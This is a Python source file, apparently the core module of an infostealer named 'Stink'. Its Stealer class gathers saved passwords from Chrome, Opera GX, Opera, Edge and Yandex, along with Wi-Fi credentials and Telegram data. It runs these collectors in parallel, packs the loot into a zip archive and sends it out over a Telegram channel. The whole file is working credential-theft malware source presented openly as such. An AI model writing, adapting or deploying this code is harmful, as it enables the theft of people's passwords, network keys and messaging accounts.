from multiprocessing import Pool
from threading import Thread

from stink.enums import Features
from stink.helpers import functions, MemoryStorage
from stink.helpers.config import MultistealerConfig, Browsers
from stink.modules import (
    Chromium,
    Telegram,
    Wifi,
    TelegramSender,
)
from getpass import getuser
from random import random


class Stealer(Thread):
    """
    Collects and sends the specified data.
    """

    def __init__(self, sender: TelegramSender = None):
        Thread.__init__(self, name="S")

        self.__config = MultistealerConfig()
        self.__storage = MemoryStorage()
        self.__sender = sender

        browser_functions = [
            Features.passwords,
        ]

        self.__methods = [
            {
                "object": Chromium,
                "arguments": (
                    Browsers.CHROME.value,
                    self.__config.BrowsersData[Browsers.CHROME]["path"],
                    self.__config.BrowsersData[Browsers.CHROME]["process"],
                    browser_functions,
                ),
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.OPERA_GX.value,
                    self.__config.BrowsersData[Browsers.OPERA_GX]["path"],
                    self.__config.BrowsersData[Browsers.OPERA_GX]["process"],
                    browser_functions,
                ),
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.OPERA_DEFAULT.value,
                    self.__config.BrowsersData[Browsers.OPERA_DEFAULT]["path"],
                    self.__config.BrowsersData[Browsers.OPERA_DEFAULT]["process"],
                    browser_functions,
                ),
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.EDGE.value,
                    self.__config.BrowsersData[Browsers.EDGE]["path"],
                    self.__config.BrowsersData[Browsers.EDGE]["process"],
                    browser_functions,
                ),
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.YANDEX.value,
                    self.__config.BrowsersData[Browsers.YANDEX]["path"],
                    self.__config.BrowsersData[Browsers.YANDEX]["process"],
                    browser_functions,
                ),
            },
            {
                "object": Wifi,
                "arguments": ("System",),
            },
            {
                "object": Telegram,
                "arguments": ("Programs/Telegram",),
            }
        ]

    def run(self) -> None:
        """
        Launches the Stink.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:
            with Pool(processes=self.__config.PoolSize) as pool:
                results = pool.starmap(
                    functions.run_process,
                    [
                        (method["object"], method["arguments"])
                        for method in self.__methods
                    ],
                )
            pool.close()
            output_file_path = f"{getuser()}.{random()}.zip"
            self.__storage.create_zip(
                [file for files in results if files for file in files], output_file_path
            )
            if self.__sender:
                self.__sender.run(output_file_path)

        except Exception as e:
            print(f"[Multi stealer]: {repr(e)}")
